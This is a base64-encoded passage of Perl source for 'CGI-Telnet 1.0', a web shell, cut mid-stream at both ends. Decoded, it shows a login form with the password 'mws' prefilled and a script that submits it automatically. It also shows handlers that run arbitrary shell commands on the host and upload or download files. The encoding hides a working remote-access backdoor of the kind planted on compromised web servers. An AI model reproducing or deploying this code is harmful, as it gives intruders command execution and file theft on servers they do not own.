plPSIyIiBjb2xvcj0iI0ZGRkZGRiI+PGI+Q0dJLVRlbG5ldCBWZXJzaW9uIDEuMCAtIENvbm5lY3RlZCB0byAkU2VydmVyTmFtZTwvYj48L2ZvbnQ+PC90ZD4KPC90cj4KPHRyPgo8dGQgY29sc3Bhbj0iMiIgYmdjb2xvcj0iI0MyQkZBNSI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+VXBsb2FkIEZpbGU8L2E+IHwgCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5Eb3dubG9hZCBGaWxlPC9hPiB8CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+RGlzY29ubmVjdDwvYT4gfAo8YSBocmVmPSJodHRwOi8vd3d3LnJvaGl0YWIuY29tL2NnaXNjcmlwdHMvY2dpdGVsbmV0Lmh0bWwiPkhlbHA8L2E+CjwvZm9udD48L3RkPgo8L3RyPgo8L3RhYmxlPgo8Zm9udCBjb2xvcj0iI0MwQzBDMCIgc2l6ZT0iMyI+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBMb2dpbiBTY3JlZW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRMb2dpblNjcmVlbgp7CgkkTWVzc2FnZSA9IHEkPHByZT48Zm9udCBjb2xvcj0iIzY2OTk5OSI+IF9fX19fICBfX19fXyAgX19fX18gICAgICAgICAgX19fX18gICAgICAgIF8gICAgICAgICAgICAgICBfCi8gIF9fIFx8ICBfXyBcfF8gICBffCAgICAgICAgfF8gICBffCAgICAgIHwgfCAgICAgICAgICAgICB8IHwKfCAvICBcL3wgfCAgXC8gIHwgfCAgIF9fX19fXyAgIHwgfCAgICBfX18gfCB8IF8gX18gICAgX19fIHwgfF8KfCB8ICAgIHwgfCBfXyAgIHwgfCAgfF9fX19fX3wgIHwgfCAgIC8gXyBcfCB8fCAnXyBcICAvIF8gXHwgX198CnwgXF9fL1x8IHxfXCBcIF98IHxfICAgICAgICAgICB8IHwgIHwgIF9fL3wgfHwgfCB8IHx8ICBfXy98IHxfCiBcX19fXy8gXF9fX18vIFxfX18vICAgICAgICAgICBcXy8gICBcX19ffHxffHxffCB8X3wgXF9fX3wgXF9ffCAxLjAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4gICAgICAgICAgICAgICAgICAgICAgX19fX19fICAgICAgICAgICAgIDwvZm9udD48Zm9udCBjb2xvcj0iI0FFODMwMCI+wqkgMjAwMSwgUm9oaXRhYiBCYXRyYTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+CiAgICAgICAgICAgICAgICAgICAuLSZxdW90OyAgICAgICZxdW90Oy0uCiAgICAgICAgICAgICAgICAgIC8gICAgICAgICAgICBcCiAgICAgICAgICAgICAgICAgfCAgICAgICAgICAgICAgfAogICAgICAgICAgICAgICAgIHwsICAuLS4gIC4tLiAgLHwKICAgICAgICAgICAgICAgICB8ICkoX28vICBcb18pKCB8CiAgICAgICAgICAgICAgICAgfC8gICAgIC9cICAgICBcfAogICAgICAgKEBfICAgICAgIChfICAgICBeXiAgICAgXykKICBfICAgICApIFw8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPl9fX19fX188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPlw8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPl9fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj58SUlJSUlJfDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPi88L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPl9fX19fX19fX19fX19fX19fX19fX19fCjwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+IChfKTwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+QDhAODwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+e308L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPiZsdDtfX19fX19fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+fC1cSUlJSUlJLy18PC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5fX19fX19fX19fX19fX19fX19fX19fX18mZ3Q7PC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4KICAgICAgICApXy8gICAgICAgIFwgICAgICAgICAgLyAKICAgICAgIChAICAgICAgICAgICBgLS0tLS0tLS1gCiAgICAgICAgICAgICA8L2ZvbnQ+PGZvbnQgY29sb3I9IiNBRTgzMDAiPlcgQSBSIE4gSSBOIEc6IFByaXZhdGUgU2VydmVyPC9mb250PjwvcHJlPgokOwojJwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgpUcnlpbmcgJFNlcnZlck5hbWUuLi48YnI+CkNvbm5lY3RlZCB0byAkU2VydmVyTmFtZTxicj4KRXNjYXBlIGNoYXJhY3RlciBpcyBeXQo8Y29kZT4kTWVzc2FnZQpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2UKewoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8YnI+bG9naW46IGFkbWluPGJyPgpwYXNzd29yZDo8YnI+CkxvZ2luIGluY29ycmVjdDxicj48YnI+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRm9ybQp7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIGlkPSJjZ2kiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0ibG9naW4iPgpsb2dpbjogYWRtaW48YnI+CnBhc3N3b3JkOjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgdmFsdWU9Im13cyIgbmFtZT0icCI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+CjwvZm9ybT4KPHNjcmlwdD5zZXRUaW1lb3V0KGZ1bmN0aW9uKCl7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NnaScpLnN1Ym1pdCgpO30sMTUwKTs8L3NjcmlwdD4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRNTCBQYWdlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50UGFnZUZvb3Rlcgp7CglwcmludCAiPC9mb250PjwvYm9keT48L2h0bWw+IjsKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlCiMgdmFyaWFibGUgJENvb2tpZXN7Jyd9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEdldENvb2tpZXMKewoJQGh0dHBjb29raWVzID0gc3BsaXQoLzsgLywkRU5WeydIVFRQX0NPT0tJRSd9KTsKCWZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpCgl7CgkJKCRpZCwgJHZhbCkgPSBzcGxpdCgvPS8sICRjb29raWUpOwoJCSRDb29raWVzeyRpZH0gPSAkdmFsOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBzY3JlZW4gd2hlbiB0aGUgdXNlciBsb2dzIG91dAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ291dFNjcmVlbgp7CglwcmludCAiPGNvZGU+Q29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+PC9jb2RlPiI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBMb2dzIG91dCB0aGUgdXNlciBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGxvZ2luIGFnYWluCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFBlcmZvcm1Mb2dvdXQKewoJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPTtcbiI7ICMgcmVtb3ZlIHBhc3N3b3JkIGNvb2tpZQoJJlByaW50UGFnZUhlYWRlcigicCIpOwoJJlByaW50TG9nb3V0U2NyZWVuOwoJJlByaW50TG9naW5TY3JlZW47CgkmUHJpbnRMb2dpbkZvcm07CgkmUHJpbnRQYWdlRm9vdGVyOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdAojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0CiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyCiMgdG8gbG9naW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ2luIAp7CglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZAoJewoJCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7CgkJJlByaW50UGFnZUhlYWRlcigiYyIpOwoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9CgllbHNlICMgcGFzc3dvcmQgZGlkbid0IG1hdGNoCgl7CgkJJlByaW50UGFnZUhlYWRlcigicCIpOwoJCSZQcmludExvZ2luU2NyZWVuOwoJCWlmKCRMb2dpblBhc3N3b3JkIG5lICIiKSAjIHNvbWUgcGFzc3dvcmQgd2FzIGVudGVyZWQKCQl7CgkJCSZQcmludExvZ2luRmFpbGVkTWVzc2FnZTsKCQl9CgkJJlByaW50TG9naW5Gb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtCnsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgokUHJvbXB0CjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjIj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgo8L2NvZGU+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZG93bmxvYWQgZmlsZXMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtCnsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4KJFByb21wdCBkb3dubG9hZDxicj48YnI+CkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+CkRvd25sb2FkOiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byB1cGxvYWQgZmlsZXMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQp7CgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsKCXByaW50IDw8RU5EOwo8Y29kZT4KPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CiRQcm9tcHQgdXBsb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KT3B0aW9uczogJm5ic3A7PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvIiB2YWx1ZT0ib3ZlcndyaXRlIj4KT3ZlcndyaXRlIGlmIGl0IEV4aXN0czxicj48YnI+ClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4KPC9mb3JtPgo8L2NvZGU+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBDb21tYW5kVGltZW91dAp7CglpZighJFdpbk5UKQoJewoJCWFsYXJtKDApOwoJCXByaW50IDw8RU5EOwo8L3htcD4KPGNvZGU+CkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS4KPGJyPktpbGxlZCBpdCEKPGNvZGU+CkVORAoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJZXhpdDsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkKIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEV4ZWN1dGVDb21tYW5kCnsKCWlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQKCXsKCQkjIHdlIGNoYW5nZSB0aGUgZGlyZWN0b3J5IGludGVybmFsbHkuIFRoZSBvdXRwdXQgb2YgdGhlCgkJIyBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQuCgkJCgkJJE9sZERpciA9ICRDdXJyZW50RGlyOwoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsKCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7CgkJJlByaW50UGFnZUhlYWRlcigiYyIpOwoJCSRQcm9tcHQgPSAkV2luTlQgPyAiJE9sZERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRPbGREaXJdXCQgIjsKCQlwcmludCAiPGNvZGU+JFByb21wdCAkUnVuQ29tbWFuZDwvY29kZT4iOwoJfQoJZWxzZSAjIHNvbWUgb3RoZXIgY29tbWFuZCwgZGlzcGxheSB0aGUgb3V0cHV0Cgl7CgkJJlByaW50UGFnZUhlYWRlcigiYyIpOwoJCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOwoJCXByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPjx4bXA+IjsKCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7CgkJaWYoISRXaW5OVCkKCQl7CgkJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7CgkJCWFsYXJtKCRDb21tYW5kVGltZW91dER1cmF0aW9uKTsKCQl9CgkJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZAoJCXsKCQkJJHw9MTsKCQkJJENvbW1hbmQgLj0gIiB8IjsKCQkJb3BlbihDb21tYW5kT3V0cHV0LCAkQ29tbWFuZCk7CgkJCXdoaWxlKDxDb21tYW5kT3V0cHV0PikKCQkJewoJCQkJJF8gPX4gcy8oXG58XHJcbikkLy87CgkJCQlwcmludCAiJF9cbiI7CgkJCX0KCQkJJHw9MDsKCQl9CgkJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzCgkJewoJCQlwcmludCBgJENvbW1hbmRgOwoJCX0KCQlpZighJFdpbk5UKQoJCXsKCQkJYWxhcm0oMCk7CgkJfQoJCXByaW50ICI8L3htcD4iOwoJfQoJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkmUHJpbnRQYWdlRm9vdGVyOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXIKIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gKIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5LgojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQp7Cglsb2NhbCgkRmlsZVVybCkgPSBAXzsKCWlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cwoJewoJCSMgZW5jb2RlIHRoZSBmaWxlIGxpbmsgc28gd2UgY2FuIHNlbmQgaXQgdG8gdGhlIGJyb3dzZXIKCQkkRmlsZVVybCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7CgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOwoJCSRIdG1sTWV0YUhlYWRlciA9ICI8bWV0YSBIVFRQLUVRVUlWPVwiUmVmcmVzaFwiIENPTlRFTlQ9XCIxOyBVUkw9JERvd25sb2FkTGlua1wiPiI7CgkJJlByaW50UGFnZUhlYWRlcigiYyIpOwoJCXByaW50IDw8RU5EOwo8Y29kZT4KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+CklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LAo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPi4KPC9jb2RlPgpFTkQKCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdAoJewoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsKCQlwcmludCAiPGNvZGU+RmFpbGVkIHRvIGRvd25sb2FkICRGaWxlVXJsOiAkITwvY29kZT4iOwoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gcmVhZHMgdGhlIHNwZWNpZmllZCBmaWxlIGZyb20gdGhlIGRpc2sgYW5kIHNlbmRzIGl0IHRvIHRoZQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2FuIGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIHNlbnQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyCnsKCWxvY2FsKCRTZW5kRmlsZSkgPSBAXzsKCWlmKG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcKCXsKCQlpZigkV2luTlQpCgkJewoJCQliaW5tb2RlKFNFTkRGSUxFKTsKCQkJYmlubW9kZShTVERPVVQpOwoJCX0KCQkkRmlsZVNpemUgPSAoc3RhdCgkU2VuZEZpbGUpKVs3XTsKCQkoJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiAgbSEoW14vXlxcXSopJCE7CgkJcHJpbnQgIkNvbnRlbnQtV